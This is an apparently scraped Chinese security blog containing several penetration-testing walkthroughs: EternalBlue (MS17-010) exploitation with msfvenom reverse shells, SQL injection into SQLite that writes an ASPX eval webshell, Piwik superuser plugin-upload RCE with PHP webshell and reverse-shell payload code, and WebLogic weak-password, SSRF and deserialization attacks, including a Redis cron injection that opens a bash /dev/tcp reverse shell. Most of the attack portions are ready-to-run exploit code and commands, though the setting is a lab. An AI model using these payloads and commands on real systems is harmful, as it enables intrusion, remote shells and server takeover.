2.下载利用脚本，并编译内核shellcode1git clone https://github.com/worawit/MS17-010 编译内核shellcode 123cd MS17-010/shellcode/nasm -f bin eternalblue_kshellcode_x64.asmnasm -f bin eternalblue_kshellcode_x86.asm 3.生成反弹exp12msfvenom -p windows/meterpreter/reverse_tcp EXITFUNC=thread LHOST=192.168.217.1 LPORT=4445 -f raw -o ../../Git/MS17-010/shellcode/sc_x86_msf.binmsfvenom -p windows/x64/meterpreter/reverse_tcp EXITFUNC=thread LHOST=192.168.217.1 LPORT=4444 -f raw -o ../../Git/MS17-010/shellcode/sc_x64_msf.bin 4.合并SHELLCODE123cat eternalblue_kshellcode_x64 sc_x64_msf.bin &gt; sc_x64.bincat eternalblue_kshellcode_x86 sc_x86_msf.bin &gt; sc_x86.binpython eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin 5.开启Metasploit并监听1234567891011msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set ExitOnSession falsemsf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; set EXITFUNC threadmsf exploit(handler) &gt; set LHOST 192.168.217.1msf exploit(handler) &gt; set LPORT 4444msf exploit(handler) &gt; exploit -j...msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set LPORT 4445msf exploit(handler) &gt; exploit -j 6.进行攻击1python eternalblue_exploit7.py 192.168.131.133 shellcode\\sc_all.bin 看到已经获取Meterpreter反弹。 遇到的问题在PentestBox中运行一些命令时(如msfconsole)，提示不是内部或外部命令，也不是可运行的程序或批处理文件。解决方法：输入cmd之后再输入需要执行的命令。 总结1.这种方式利用稍微简单点，不需要过多的命令，而且生成的SHELLCODE也具有复用性。2.在以上的操作中，均生成了32位和64位的shellcode，最后利用eternalblue_sc_merge脚本合并到一起。然后在Eternalblue漏洞中利用合并的shellcode可以支持x86和x64，无需再检测目标体系结构。3.在使用中设置了线程，可以同时对多个系统进行攻击测试。例如： 1234python eternalblue_exploit7.py 192.168.131.133 shellcode\\sc_all.binpython eternalblue_exploit7.py 192.168.131.134 shellcode\\sc_all.binpython eternalblue_exploit7.py 192.168.131.135 shellcode\\sc_all.binpython eternalblue_exploit7.py 192.168.131.136 shellcode\\sc_all.bin 攻击结果： 参考[1]https://github.com/worawit/MS17-010[2]https://www.exploit-db.com/docs/42280.pdf","tags":[{"name":"MS17-010","slug":"MS17-010","permalink":"https://fuping.site/tags/MS17-010/"},{"name":"PentestBox","slug":"PentestBox","permalink":"https://fuping.site/tags/PentestBox/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://fuping.site/tags/Metasploit/"}]},{"title":"SQLite手工注入Getshell技巧","date":"2017-07-19T11:07:30.000Z","path":"2017/07/19/SQLite-Injection-Get-WebShell/","text":"0x01 前言SQLite是一种嵌入式数据库，它的数据库就是一个文件。由于SQLite本身是C写的，而且体积很小，所以经常被集成到各种应用程序中，主要在手机的App中使用。之前没有遇到过关于SQLite的注入，这次遇到一个在ASPX中使用SQLite数据库，并且存在注入。这篇文章将主要介绍一下从注入到获取WEBSHELL的过程和遇到的一些坑。首先介绍一下SQLite的使用方法，然后在本地搭建环境以及利用注入获取WEBSHELL，最后将讲述在实际应用中遇到的问题以及如何解决（e.g.手工注入写shell）。 0x02 SQLite的使用SQLite 的一个重要的特性是零配置的，这意味着不需要复杂的安装或管理。在 Windows 上使用SQLite时访问 SQLite下载页面，从 Windows 区下载预编译的二进制文件。现在最新的为sqlite-tools-win32-x86-3190300.zip，下载下来后解压。我这里将其中的文件复制到D:\\sqlite目录。 SQLite的语法和其他数据库差不多，只不过SQLite的数据库是一个单独的文件。SQLite创建数据库的方法有两种，一种是创建，另外一种是附加。 创建使用命令：sqlite3.exe 数据库文件名。例如创建一个名字为aa.db的数据库，使用命令：sqlite3.exe aa.db。 附加数据库的基本语法是：ATTACH DATABASE &#39;DatabaseName&#39; As &#39;Alias-Name&#39;;。如果数据库尚未被创建，这个命令将创建一个数据库，如果数据库已存在，则把数据库文件名称与逻辑数据库 ‘Alias-Name’ 绑定在一起。例如附加一个bb.db的数据库，别名为a，命令为：attach database &#39;d:\\\\sqlite\\\\bb.db&#39; as &#39;a&#39;;。 创建表并插入数据的命令如下： 1create table a.tt(dataz text); INSERT into a.tt(dataz) VALUES ('test'); SQLite还可以生成任意后缀名的数据库文件。例如创建一个php结尾的数据库文件，新建一个名为exp的表，并在其中插入数据，内容为：&lt;?php phpinfo();?&gt;。 具体命令如下： 1sqlite&gt;ATTACH DATABASE 'd:\\\\sqlite\\\\23.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('&lt;?php phpinfo();?&gt;');-- 将生成的数据库文件23.php放在web目录，然后访问。发现数据库中插入的数据竟被解析了。 同样的方法生成aspx后缀的数据库文件，创建表，并插入&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;。然后将该文件放在IIS服务的web目录。发现其中的APSX代码也会被解析。 通过查看生成的数据库文件，发现其中表的内容都以原格式存储的，这就导致了表中的代码被解析的原因。接下来将在本地搭建一个ASPX+SQLite的web项目，演示一下如何通过SQL注入获取WEBSHELL。 0x03 本地环境搭建及获取SHELL因为在实际应用中遇到的是.Net开发的web项目，所以这里也以ASPX程序为例。 1.环境搭建和项目的部署下载安装 Sqlite ADO.NET，下载后直接安装即可。安装后将其中的System.Data.SQLite.DLL文件复制出来，在下面的项目中将会用到（分32和64位，根据自己的环境选择）。 这里我采用VS2013，新建一个ASP.NET网站，在项目中新建一个Bin文件夹和一个ASPX页面（这里名称为Default.aspx)，将上面复制出来的System.Data.SQLite.DLL文件放在Bin目录中。 其目录结构如图： Default.aspx是显示页面，其中有一个文本框和按钮。主要代码： 123456&lt;form id=\"form1\" runat=\"server\"&gt;&lt;div&gt; &lt;asp:TextBox ID=\"TextBox1\" runat=\"server\"&gt;&lt;/asp:TextBox&gt; &lt;asp:Button ID=\"Button1\" runat=\"server\" OnClick=\"btn_Click\" Text=\"查询\" /&gt;&lt;/div&gt;&lt;/form&gt; Default.aspx.cs是代码的实现，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162using System;using System.Collections.Generic;using System.Linq;using System.Web;using System.Web.UI;using System.Web.UI.WebControls;using System.Data.SQLite; public partial class _Default : System.Web.UI.Page&#123; protected void Page_Load(object sender, EventArgs e) &#123; if (!System.IO.File.Exists(Server.MapPath(\"~\") + \"/UserData.dbx\")) &#123; SQLiteConnection.ClearAllPools(); SQLiteConnection.CreateFile(Server.MapPath(\"~\") + \"/UserData.dbx\"); SQLiteConnection conn = new SQLiteConnection(\"Data Source=\" + Server.MapPath(\"~\" + \"/UserData.dbx\")); conn.Open(); SQLiteCommand cmd = new SQLiteCommand(); cmd.CommandText = \"create table Users (UserID int primary key,UserName varchar(100) not null,UserPassword varchar(100) not null)\"; cmd.Connection = conn; cmd.ExecuteNonQuery(); for (int i = 0; i &lt; 100; i++) &#123; cmd.CommandText = \"insert into Users (UserID,UserName,UserPassword) values (\" + i + \",'TestUser_\" + i + \"','\" + DateTime.Now.ToString().Replace(\" \", \"-\").Replace(\":\", \"-\") + \"')\"; cmd.ExecuteNonQuery(); &#125; conn.Clone(); conn.Dispose(); Response.Write(\"初始化~~&lt;br /&gt;\"); &#125; Response.Write(\"加载成功~~&lt;br /&gt;\"); &#125; protected void btn_Click(object sender, EventArgs e) &#123; if (TextBox1.Text != \"\")&#123; SQLiteConnection.ClearAllPools(); //SQLiteConnection.CreateFile(Server.MapPath(\"~\") + \"/UserData.dbx\"); SQLiteConnection conn = new SQLiteConnection(\"Data Source=\" + Server.MapPath(\"~\" + \"/UserData.dbx\")); conn.Open(); SQLiteCommand cmd = new SQLiteCommand(); cmd.CommandText = \"select UserPassword from Users where UserName='\" + TextBox1.Text.Trim()+\"'\"; cmd.Connection = conn; if (cmd.ExecuteScalar() != null) &#123; string tempUserName = cmd.ExecuteScalar().ToString(); Response.Write(\"查询结果为:\" + tempUserName + \"&lt;br /&gt;&lt;br /&gt;\"); &#125; else &#123; Response.Write(\"无此用户\"); &#125; &#125; else &#123; Response.Write(\"请输入查询内容~~&lt;br /&gt;\"); &#125; &#125;&#125; 然后将项目部署即可，这就是一个存在注入的项目。接下来就是利用注入来获取WEBSHELL。 2.SQL注入写WEBSHELL 当输入&#39;时，项目报错，同时将web绝对路径暴露出来。 然后就根据上面SQLite创建ASPX格式的数据库的方式来写入一个WEBSHELL。 其语句为： 1';ATTACH DATABASE 'c:\\\\WebSite\\\\css.aspx' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('&lt;%@ Page Language=\"Jscript\"%&gt;&lt;%eval(Request.Item[\"pass\"],\"unsafe\");%&gt;'); -- 测试环境很顺利就通过SQL注入写入了WEBSHELL，但是在实际测试中并非如此顺利。接下来看看在实际应用中遇到的问题以及解决的方法。 0x04 实际中应用中遇到的问题及解决方法已知：该系统存在SQL注入，数据库为SQLite，通过报错发现web项目的绝对路径。后台存在弱口令，后台可以上传图片格式文件。 直接利用SQLite写aspx文件时，发现可以写入成功，但是SHELL没有执行。无法判断是shell代码未写入成功还是未执行成功。然后就先写个TXT查看shell代码是否可以写入成功。 1';ATTACH DATABASE 'd:\\\\********\\\\web\\\\24.txt' AS pwn ;create TABLE pwn.exp (dataz text) ; insert INTO pwn.exp (dataz) VALUES ('&lt;%@ Page Language=\"Jscript\"&gt;&lt;%eval(Request.Item[\"pass\"],\"unsafe\");%&gt;'); -- 然后直接访问根目录下的24.txt文件即可下载，下载后用SQLite数据库管理工具打开，这里用的是Navicat。 打开发现竟然是空的。然而将shell代码替换为字符串test时可以写入成功。那应该就是写入的SHELL中含有一些符号所致，这里尝试了转义都未能解决。 由于可以找到图片上传的入口，所以有这样一个思路：在本地生成一个格式为jpg的数据库文件，创建表并写入SHELL，然后上传到服务器；在网站上利用注入新建一个txt格式的数据库，创建表后将图片格式数据库的内容插入到txt格式数据库中。 提示数据库编码不一致，那就换另外一种方法。首先在web根目录生成一个jpg格式的数据库，创建表后下载；在本地打开后插入数据，之后上传到服务器；再在网站新建一个ASPX格式的数据库，创建表后将图片格式数据库的内容插入到ASPX格式数据库中。 1';ATTACH DATABASE 'd:\\\\********\\\\web\\\\fp.jpg' AS pwn;create TABLE pwn.exp(dataz text);-- 可以成功写入，但访问发现插入的ASPX代码被原样输出，SHELL未执行成功。然后来对比一下在web上生成和本地生成的文件有什么区别。 分别在本地和web上生成一个txt格式的数据库文件，新建表后插入test。然后对比其内容： 对比后发现网站生成的内容都多了一个空格。 有同事提议说用十六进制试试，然后将shell内容转换为十六进制后插入。然而在web上测试失败。 本地测试也失败。 经过搜索发现，SQLite中十六进制的写法为：x&#39;....&#39;，而不是0x....。 例如&lt;%@ Page Language=&quot;Jscript&quot;&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;在SQLite中的十六进制表示为： 1x'3c25402050616765204c616e67756167653d224a736372697074223e3c256576616c28526571756573742e4974656d5b2270617373225d2c22756e7361666522293b253e' 成功写入shell 菜刀连接： 0x05 总结通过以上的测试过程和实际利用，可以归纳两点： 1.SQLite可以创建任意格式的数据库文件，并且插入的代码可以根据文件格式来解析，这就造成了可以利用这种方式写WEBSHELL的原因。2.SQLite中十六进制的写法为：x&#39;....&#39;，而不是0x....。 0x06 参考[1]http://www.cnblogs.com/xiaozi/p/5760321.html[2]https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet[3]http://blog.csdn.net/mazhaojuan/article/details/7660657","tags":[{"name":"WEBSHELL","slug":"WEBSHELL","permalink":"https://fuping.site/tags/WEBSHELL/"},{"name":"SQLite","slug":"SQLite","permalink":"https://fuping.site/tags/SQLite/"}]},{"title":"Piwik代码执行漏洞安全分析（附验证过程Getshell）","date":"2017-07-12T09:50:14.000Z","path":"2017/07/12/Piwik-Superuser-Plugin-Upload-GetShell/","text":"0x01 概述Piwik是一个PHP和MySQL的开放源代码的Web统计软件. 它给你一些关于你的网站的实用统计报告，比如网页浏览人数, 访问最多的页面, 搜索引擎关键词等等。 Piwik拥有众多不同功能的插件，你可以添加新的功能或是移除你不需要的功能，Piwik同样可以安装在你的服务器上面，数据就保存在你自己的服务器上面。你可以非常容易的插入统计图表到你的博客或是网站抑或是后台的控制面板中。安装完成后，你只需将一小段代码放到将要统计的网页中即可。 在17年2月份FireFart报告了一个Piwik超级用户获取远程代码执行的漏洞。该漏洞通过利用构造插件，然后利用超级用户上传并激活，在激活插件时会执行插件中的PayLoad，从而获取shell。本文将介绍一下漏洞原理、环境的搭建、PayLoad的构造以及漏洞的复现过程，如有不足，请多多指教。 0x02 漏洞原理分析插件激活时请求的URL为：http://192.168.217.1/piwik-3.0.1/index.php?module=CorePluginsAdmin&amp;action=activate&amp;idSite=1&amp;period=day&amp;date=yesterday&amp;nonce=4fe9b3937078e06f3f24d45a53ee614c&amp;pluginName=ff 代码定位到piwik-3.0.1\\plugins\\CorePluginsAdmin\\Controller.php中的activate方法。 找到pluginManager调用的激活插件方法。 123456789public function activate($redirectAfter = true) &#123; $pluginName = $this-&gt;initPluginModification(static::ACTIVATE_NONCE); $this-&gt;dieIfPluginsAdminIsDisabled(); $this-&gt;pluginManager-&gt;activatePlugin($pluginName);//激活插件 .... //省略部分代码 &#125; 然后往上翻，找到pluginManager变量。 12345private $pluginManager;....//省略部分代码$this-&gt;pluginManager = Plugin\\Manager::getInstance();..... 定位到piwik-3.0.1\\core\\Plugin\\Manager.php文件，找到其activatePlugin方法。 1234567891011121314public function activatePlugin($pluginName) &#123; .... //省略部分代码 // Load plugin $plugin = $this-&gt;loadPlugin($pluginName); if ($plugin === null) &#123; throw new \\Exception(\"The plugin '$pluginName' was found in the filesystem, but could not be loaded.'\"); &#125; $this-&gt;installPluginIfNecessary($plugin); $plugin-&gt;activate(); .... //省略部分代码 &#125; loadPlugin是根据插件名字加载，最后生成一个类对象，可以直接调用其中的方法，其代码如下： 12345678910public function loadPlugin($pluginName)&#123; if (isset($this-&gt;loadedPlugins[$pluginName])) &#123; return $this-&gt;loadedPlugins[$pluginName]; &#125; $newPlugin = $this-&gt;makePluginClass($pluginName); $this-&gt;addLoadedPlugin($pluginName, $newPlugin); return $newPlugin;&#125; installPluginIfNecessary方法是判断该插件是否安装，如果没有安装的话，调用executePluginInstall方法来安装，executePluginInstall方法执行了插件中的install()方法，然后再执行activate()方法。 由此可知，当激活插件时，会加载插件，将其生成为类对象。然后判断是否安装插件，如果没有安装，调用插件中的install()方法，再调用activate()方法。接下来就开始搭建环境具体来实现一下。 0x03 环境的搭建1.准备工作主机：Windows10 x64 WEB环境：采用的是phpStudy集成环境（PHP/5.5.30，MySQL/5.5.47，Apache/2.4.18 ） 程序版本：3.0.1(也可以在https://builds.piwik.org/ 下载) 2.composer工具的安装下载地址：https://getcomposer.org/Composer-Setup.exe 下载后直接运行Composer-Setup.exe进行安装。 然后根据提示，继续下一步即可。 注意：安装时PHP应开启php_openssl扩展，不然会报错。 3.Piwik程序的部署将下载下来的程序源码解压到phpStudy下的WWW目录。这里我项目名字为piwik-3.0.1。 在piwik-3.0.1目录下执行composer install命令来安装项目所依赖的代码库。 安装后在项目的根目录会出现一个vendor文件夹。 访问http://192.168.217.1/piwik-3.0.1/ 开始进行安装 点击Next进行下一步安装。 数据库设置 超级用户设置 之后进行系统的设置，这里就省略过程了。 安装完成后访问http://192.168.217.1/piwik-3.0.1/ 进行登陆。 用户名/密码为第五步中设置的超级用户。 0x04 验证过程1.漏洞产生原因及PayLoad的编写Piwik默认在3.0.3之前允许自定义插件上传，当插件被激活时，install方法会被调用，会执行其中编写的PayLoad。 如果我们编写一个名字叫做pwned的插件，其文件结构为： 123pwned/pwned/pwned.phppwned/plugin.json 文件内容： pwned.php 12345678&lt;?phpnamespace Piwik\\Plugins\\pwned;class pwned extends \\Piwik\\Plugin &#123; public function install() &#123; //要执行的Payload &#125;&#125; plugin.json 123456&#123; \"name\": \"pwned\",//插件名称 \"description\": \"DESCRIPTION\",//插件描述 \"version\": \"1.0\",//插件版本 \"theme\": false&#125; 然后将其压缩为zip格式的压缩文件。当插件上传后并被激活时，就会执行pwned.php中的payload。 2.漏洞利用PayLoad的准备 修改上述的pwned.php代码，在install方法中添加写shell的代码。 12345678910&lt;?phpnamespace Piwik\\Plugins\\pwned;class pwned extends \\Piwik\\Plugin &#123; public function install() &#123; $myfile = fopen(\"shell.php\", \"w\") or die(\"Unable to open file!\"); $content = \"&lt;?eval(\\$_POST['pass']);?&gt;\"; fwrite($myfile, $content); &#125;&#125; plugin.json不用做过多的修改。 然后压缩为pwned.zip。 PayLoad的利用 利用创建的超级用户登陆，登陆后点击Administration或者访问http://192.168.217.1/piwik-3.0.1/index.php?module=CoreAdminHome&amp;action=home&amp;idSite=1&amp;period=day&amp;date=yesterday 安装新插件 上传新插件 插件上传 插件上传成功 然后点击激活插件按钮 插件激活后，会在根目录生成一个shell.php 3.利用Metasploit生成meterpreter会话上面的结果是写入了WEBSHELL，也可以采用piwik_superuser_plugin_upload直接生成一个meterpreter会话。 1234567891011msf &gt; use exploit/unix/webapp/piwik_superuser_plugin_upload msf exploit(piwik_superuser_plugin_upload) &gt; msf exploit(piwik_superuser_plugin_upload) &gt; set PASSWORD admin888PASSWORD =&gt; admin888msf exploit(piwik_superuser_plugin_upload) &gt; set RHOST 192.168.217.1RHOST =&gt; 192.168.217.1msf exploit(piwik_superuser_plugin_upload) &gt; set TARGETURI /piwik-3.0.1/TARGETURI =&gt; /piwik-3.0.1/msf exploit(piwik_superuser_plugin_upload) &gt; set USERNAME adminUSERNAME =&gt; adminmsf exploit(piwik_superuser_plugin_upload) &gt; exploit 利用Metasploit时有时候会不成功，或者是第一次成功之后无法再次复现。但是利用上传webshell可以成功。 0x05 总结之前在3月份曾经遇到过类似的站点，然后本地搭建环境测试的时候，只顾着用Metasploit进测试，并没有出结果，就没继续下去了。最近又重新看了一下原理，然后实现并记录一下过程。 这里仅仅用3.0.1举例，根据firefart说的影响版本2.14.0/2.16.0/2.17.1/3.0.1，其他并未测试。 Q:直接上传包含shell的压缩包可以吗？ A:可以上传成功，但在plugins目录下无法执行php代码。 Q:Payload中除了install()方法还可以写其他方法吗？ A:可以的。例如还有uninstall/deactivate/activate等方法，分别在卸载插件/关闭插件/激活插件的时候调用。例如如下的代码： 123456789101112131415161718192021222324252627282930&lt;?phpnamespace Piwik\\Plugins\\ff;class ff extends \\Piwik\\Plugin &#123; public function install()//安装插件，执行一次 &#123; $myfile = fopen(\"install.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"install ...\"; fwrite($myfile, $content); &#125; public function uninstall()//卸载插件，执行一次 &#123; $myfile = fopen(\"uninstall.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"uninstall ...\"; fwrite($myfile, $content); &#125; public function deactivate()//关闭插件，可以多次执行 &#123; $myfile = fopen(\"deactivate.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"deactivate ...\"; fwrite($myfile, $content); &#125; public function activate()//激活插件，可以多次执行 &#123; $myfile = fopen(\"activate.txt\", \"w\") or die(\"Unable to open file!\"); $content = \"activate ...\"; fwrite($myfile, $content); &#125;&#125; Q:可以上传WEBSHELL，但是利用Metasploit无法生成meterpreter会话，还想反弹shell怎么办？ A:可以利用手动上传插件的方法，将其中的Payload修改为反弹shell的代码。 具体可以这样操作： 首先看看Metasploit利用的Payload是什么。 可以在generate_plugin方法中添加打印payload.encoded的语句，例如使用print_status(&quot;data:#{payload.encoded}&quot;)将其内容打印出来 然后使用reload_all重新加载脚本，并使用piwik_superuser_plugin_upload脚本，将会打印出来payload的内容 或者可以利用msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.131.128 LPORT=4444 -f raw &gt;c.php来生成payload，内容一样 然后将生成的内容放在插件PHP代码中。整理格式后如下： 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace Piwik\\Plugins\\pwned;class pwned extends \\Piwik\\Plugin &#123; public function install() &#123; error_reporting(0); $ip = '192.168.131.128'; $port = 4444; if (($f = 'stream_socket_client') &amp;&amp; is_callable($f)) &#123; $s = $f(\"tcp://&#123;$ip&#125;:&#123;$port&#125;\"); $s_type = 'stream'; &#125; elseif (($f = 'fsockopen') &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = 'stream'; &#125; elseif (($f = 'socket_create') &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = 'socket'; &#125; else &#123; die('no socket funcs'); &#125; if (!$s) &#123; die('no socket'); &#125; switch ($s_type) &#123; case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(\"Nlen\", $len); $len = $a['len']; $b = ''; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die(); &#125;&#125; 然后就是利用上传插件来上传插件并激活了。 正确姿势： 请注意要加set PAYLOAD php/meterpreter/reverse_tcp，不然会报各种错误。 下面的为其中的错误。 0x06 参考[1]https://firefart.at/post/turning_piwik_superuser_creds_into_rce/[2]https://github.com/rapid7/metasploit-framework/pull/7917","tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://fuping.site/tags/Metasploit/"},{"name":"piwik","slug":"piwik","permalink":"https://fuping.site/tags/piwik/"},{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://fuping.site/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}]},{"title":"Weblogic 常见漏洞环境的搭建及其利用","date":"2017-06-05T01:19:34.000Z","path":"2017/06/05/Weblogic-Vulnerability-Verification/","text":"0x00 WebLogic 介绍及常见漏洞WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。WebLogic常用端口7001/7002，常见漏洞有弱口令导致上传任意war包、SSRF漏洞和反序列化漏洞。本文将利用phith0n提供的漏洞利用环境进行验证(在此向P牛致敬，感谢无私奉献)，Weblogic的环境地址https://github.com/phith0n/vulhub/tree/master/weblogic。 0x01 WebLogic 弱口令导致上传并部署war包获取WEBSHELL通过WebLogic弱口令登录后，上传war包，来获取WEBSHELL。下载项目后进入到/weblogic/weak_password目录，运行命令sudo docker-compose build进行编译（请参照https://github.com/phith0n/vulhub/blob/master/README.md 进行docker的安装）。编译完成后进行启动使用如下命令： 12fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker-compose up -d #启动fuping@ubuntu:~/Git/vulhub/weblogic/weak_password$ sudo docker ps #查看启动的docker Ubuntu的ip为192.168.232.137，WebLogic的访问地址为：http://192.168.232.137:7001 访问 http://192.168.232.137:7001/console 会跳转到管理员登录页面http://192.168.232.137:7001/console/login/LoginForm.jsp 这里用户名密码分别为：weblogic/Oracle@123上传war过程如下图所示 总结起来就是：域结构-部署-安装-上传文件-将此部署安装为应用程序。然后访问项目名称即可。 如果不存在弱口令，可以根据其他漏洞获取SerializedSystemIni.dat和config.xml，然后解密即可。具体案例可以参考https://github.com/phith0n/vulhub/blob/master/weblogic/weak_password/README.md ，这里采用了任意文件读取漏洞，获取了SerializedSystemIni.dat和config.xml文件内容，然后解密。 WebLogic加密解密方式 WebLogic 11gR1后采用了AES的加密方式，默认的管理密码文件存放于：安装目录/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties 例如靶机中的密码文件位于：/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties 内容为： 12username=&#123;AES&#125;xdwPe62ds+jcPCQwwLn/VR3fI0e9ZGkFz96ZBqmvRpY=password=&#123;AES&#125;dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU= 加密key保存在SerializedSystemIni.dat文件中。默认位置：安装目录/user_projects/domains/base_domain/security/SerializedSystemIni.dat 靶机中的位于：/root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat 采用这两个文件就可以进行解密了。 WebLogic 11gR1之前的版本采用的DES加密方式。安装目录/samples/domains/wl_server/security/boot.properties内容格式： 12username=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw==password=&#123;3DES&#125;fy709SQ4pCHAFk+lIxiWfw== 采用上面的解密工具即可解密。 0x02 WebLogic SSRF漏洞漏洞编号：CVE-2014-4210漏洞影响： 版本10.0.2,10.3.6 Oracle WebLogic Web Server既可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口。进入到/weblogic/ssrf目录，运行命令sudo docker-compose build进行编译。 编译时将Dockerfile文件中的第六行&amp;&amp; yum update \\修改为&amp;&amp; yum update -y \\，不然会出现错误ERROR: Service &#39;redis&#39; failed to build: The command &#39;/bin/sh -c set -ex &amp;&amp; yum update &amp;&amp; yum install -y gcc-c++ tcl wget&#39; returned a non-zero code: 1。并且无法编译。（感谢P牛的解答） 编译完成后进行启动使用如下命令： 12fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker-compose up -d #启动fuping@ubuntu:~/Git/vulhub/weblogic/ssrf$ sudo docker ps #查看启动的docker ![启动WebLogic SSRF环境](启动WebLogic SSRF环境.png) 利用脚本扫描内网开放端口的主机。 根据https://github.com/phith0n/vulhub/blob/master/weblogic/ssrf/README.md 利用Redis反弹shell在Ubuntu上执行命令nc -l -p 1234发送请求包 123456789GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.232.137%2F1234%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search HTTP/1.1Host: 192.168.232.137:7001User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateCookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; ADMINCONSOLESESSION=6L9hZ1GCsBrQWk49rcJ5K1zxygCPpysB4FrD8xk27XV50KzBh2rT!657144266; JSESSIONID=Q92gZ1fYpmLHP5yCxg4TpdjKCTTHhKTTZS1XKXTNDNf40R80H5J0!-1544297006Connection: closeUpgrade-Insecure-Requests: 1 过一会查看Ubuntu可以看到一个shell 修复建议： 1.如果业务不需要UDDI功能，就关闭这个功能。可以删除uddiexporer文件夹，可以可在/weblogicPath/server/lib/uddiexplorer.war解压后，注释掉上面的jsp再打包。 2.安装oracle的更新包。 0x03 WebLogic 反序列化漏洞漏洞编号：CVE-2015-4852漏洞影响： Oracle WebLogic Server 12.2.1.0 Oracle WebLogic Server 12.1.3.0 Oracle WebLogic Server 12.1.2.0 Oracle WebLogic Server 10.3.6.0 Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0版本中，WLS Security组件允许远程攻击者执行任意命令。攻击者通过向TCP端口7001发送T3协议流量，其中包含精心构造的序列化Java对象利用此漏洞。此漏洞影响到WLS Security Handler的文件oracle_common/modules/com.bea.core.apache.commons.collections.jar内一个未知的函数。 这里还以SSRF的环境为例。使用WebLogic反序列化工具进行验证（作者：rebeyond)。 一般web项目位于/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/中 发现没有_WL_user目录，所以把shell上传到自带的项目中。 通过执行命令ls /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/发现有三个目录，分别为bea_wls9_async_response、bea_wls_internal和uddiexplorer。将shell文件上传到任意一个目录下的war文件即可。 上传路径/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/1.txt 上传路径/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw/war/jspy.jsp 也可以使用weget下载。 使用weak_password时，上传路径为 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_user/_appsdir_hello_war/hnt8u/war/1.txt 找WEB绝对路径的另一种方式，Linux下使用命令find -name *.jsp来查找，例如已知hello项目里面有个file.jsp，则查找的命令为find -name file.jsp。对于Windows下，使用for /r c:\\ %i in (file*.jsp) do @echo %i，也可以通过查看config/config.xml文件内容来确定web项目的绝对路径。 linux下查找文件路径 Windows下查找路径 修复建议： 